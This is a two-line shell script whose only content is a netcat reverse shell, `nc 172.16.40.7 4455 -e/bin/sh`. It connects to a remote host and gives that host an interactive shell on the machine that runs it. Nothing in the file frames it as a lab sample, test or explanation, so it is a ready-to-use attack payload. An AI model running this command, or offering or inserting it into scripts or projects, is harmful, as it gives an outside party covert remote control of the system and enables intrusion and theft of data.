#!/bin/sh

nc 172.16.40.7 4455 -e/bin/sh
